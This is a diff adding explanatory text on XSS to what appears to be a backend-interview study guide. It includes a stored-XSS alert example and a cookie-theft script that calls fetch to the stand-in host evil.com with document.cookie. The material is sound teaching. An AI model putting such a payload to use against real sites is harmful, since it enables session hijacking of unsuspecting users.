@@ -446,42 +446,140 @@ The purpose is to check whether the server allows the actual request.
 SECTION 10: XSS (CROSS-SITE SCRIPTING)
 ================================================================================
 
+Modern web applications must protect users from various security vulnerabilities
+that can compromise sensitive data or allow attackers to perform unauthorized
+actions.
+
+Two of the most important and commonly discussed web security vulnerabilities
+are XSS (Cross-Site Scripting) and CSRF (Cross-Site Request Forgery).
+
+Both attacks exploit how browsers handle trust, cookies, and scripts.
+Understanding these attacks deeply is extremely important for backend engineers
+because these vulnerabilities frequently appear in real-world systems and are
+also commonly discussed in backend interviews.
+
+This document explains in detail:
+
+What XSS is
+How XSS attacks happen
+Types of XSS
+How XSS steals sessions
+How XSS is prevented
+
+What CSRF is
+How CSRF attacks work
+Why browsers allow CSRF
+How CSRF is prevented
+
+We also compare XSS vs CSRF and discuss real-world production defenses.
+
+
+================================================================================
+SECTION 11: XSS (CROSS-SITE SCRIPTING)
+================================================================================
+
+WHAT IS XSS?
+
 XSS stands for Cross-Site Scripting.
 
-It is a vulnerability that allows attackers to inject malicious scripts into
-web pages viewed by other users.
+XSS is a web security vulnerability that allows an attacker to inject malicious
+JavaScript code into a website. When other users visit the affected page, the
+malicious script executes inside their browser.
 
-When the victim loads the page, the malicious script executes in their browser.
+Because the script runs within the context of the trusted website domain, the
+browser allows the script to access sensitive information.
 
-Possible consequences include:
+The malicious script may gain access to:
 
-Stealing cookies
-Session hijacking
-Redirecting users to malicious websites
+cookies
+session tokens
+local storage
+user actions
+API requests
 
-
-TYPES OF XSS
-
-Stored XSS
-
-Malicious scripts are stored in the database and executed whenever users load
-the page.
+This allows attackers to impersonate users or steal login sessions.
 
 
-Reflected XSS
+WHY XSS IS DANGEROUS
 
-Malicious scripts are included in a request and immediately reflected in the
-response.
+Browsers trust scripts that originate from the website domain.
+
+For example, if a user visits:
+
+https://bank.com
+
+and a malicious script runs within that page, the browser assumes that the
+script belongs to bank.com.
+
+Because of this trust, the script can access sensitive browser data such as:
+
+document.cookie
+localStorage
+authentication tokens
 
 
-DOM-Based XSS
+================================================================================
+SECTION 12: HOW XSS ATTACKS ACTUALLY HAPPEN
+================================================================================
 
-Occurs when client-side JavaScript manipulates the DOM in unsafe ways.
+Consider a website with a comment system.
+
+Example website:
+
+https://blog.com
+
+Users are allowed to post comments.
+
+Suppose the server renders comments directly without sanitizing user input.
+
+Example vulnerable HTML rendering:
+
+<div class="comment">
+  USER_COMMENT
+</div>
+
+Now suppose an attacker posts the following comment:
+
+<script>
+alert("You are hacked")
+</script>
+
+This script is stored in the database.
+
+When another user loads the page, the browser renders:
+
+<div class="comment">
+<script>alert("You are hacked")</script>
+</div>
+
+The browser executes the script immediately.
+
+This results in the popup appearing on the user's screen.
 
 
-PREVENTION METHODS
+REAL XSS ATTACK: SESSION THEFT
 
-Input sanitization
-Output escaping
-Content Security Policy
-HTTP-only cookies
+Attackers typically do something more dangerous than displaying alerts.
+
+Example attack script:
+
+<script>
+fetch("https://evil.com/steal?cookie=" + document.cookie)
+</script>
+
+When a victim visits the page, the browser executes this script.
+
+The script reads the user's cookies using:
+
+document.cookie
+
+Then it sends the cookie value to the attacker’s server.
+
+Example stolen cookie:
+
+sessionId=abc123
+
+The attacker can now use the stolen session ID to impersonate the user.
+
+This attack is known as session hijacking.
+
